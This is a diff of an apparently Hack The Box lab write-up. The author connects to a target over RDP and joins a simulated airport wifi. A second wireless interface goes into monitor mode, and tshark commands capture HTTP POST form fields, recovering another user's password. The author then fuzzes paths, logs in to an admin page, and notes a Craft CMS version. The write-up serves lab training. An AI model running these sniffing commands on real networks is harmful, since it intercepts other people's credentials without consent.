@@ -39,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 44.29 seconds
 ## Connect via RDP
 
 ```
-rdesktop -u contractor -p 'Contractor2026!' 10.129.140.165
+rdesktop -u contractor -p 'Contractor2026!' 10.129.23.243
 ```
 
 <img width="1858" height="854" alt="image" src="https://github.com/user-attachments/assets/2bf613c1-9901-46f4-984f-ecc4742cbdc5" />
@@ -59,17 +59,90 @@ sudo su -
 > it's fucken trap i can't find flags 
 
 
+## i opend browser found :
+
+```
+http://wifi.international.htb/
+```
+
+<img width="1182" height="762" alt="image" src="https://github.com/user-attachments/assets/4e25a16d-1ee9-4920-bbf6-fcb58c25be78" />
+
+> ## To connect to the portal you need to be connected to the airport wifi:
+
+```
+http://portal.international.htb/
+```
+
+<img width="1092" height="496" alt="image" src="https://github.com/user-attachments/assets/32f0ac53-16f8-4717-b109-5885ac0c4222" />
+
+## now refresh page 
+
+<img width="1179" height="818" alt="image" src="https://github.com/user-attachments/assets/b5f8bfe4-b873-4b01-9f1b-b5b6090f2ec5" />
+
+
+## now network interface `wlan2` is connected to airport wifi 
+
+
+```
+ifconfig
+```
+
+<img width="1224" height="744" alt="image" src="https://github.com/user-attachments/assets/c7f6cbae-3e3f-4ef5-a90f-b08ecb02a145" />
 
 
 
+## sniff traffic by make `wlan3` monitor to `wlan2`
+
+```
+ip addr show wlan2; ip route
+getent hosts portal.international.htb wifi.international.htb
 
 
+ip link set wlan3 down
+iw dev wlan3 set type monitor
+ip link set wlan3 up
+iw dev wlan3 set channel 6
+tshark -i wlan3 -a duration:30 -Y 'wlan.fc.type==2' -T fields -e wlan.sa -e wlan.da 2>/dev/null | sort | uniq -c | sort -rn | head
+
+iw dev wlan3 set type monitor 2>/dev/null; ip link set wlan3 up; iw dev wlan3 set channel 6
+tshark -i wlan3 -a duration:120 -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null
+```
+
+<img width="1022" height="118" alt="image" src="https://github.com/user-attachments/assets/2388fdfe-1a69-4d5c-90d7-6a9011236a35" />
 
 
+```
+jenny : Fl1ghtDeck2026!
+```
+
+> ## i tryed it in `http://portal.international.htb/miels` but it not work so i will fuzz 
+
+i found 
+
+```
+302  /admin
+404  /login
+302  /logout
+404  /dashboard
+404  /api
+404  /api/v1
+404  /robots.txt
+404  /sitemap.xml
+200  /index.html
+404  /portal
+
+```
+
+## i checked `/admin` and i found login page 
+
+<img width="1510" height="791" alt="image" src="https://github.com/user-attachments/assets/43b74870-aeb1-46b7-aa37-c8cb16fb7221" />
 
 
+## i try to login and it work 
 
+<img width="1287" height="775" alt="image" src="https://github.com/user-attachments/assets/201c53ab-146a-4c54-93af-877c8b08a4b2" />
 
+> ### notice `Craft cms version solo 5.9.8` i searched for CVES for this version 
 
 
 
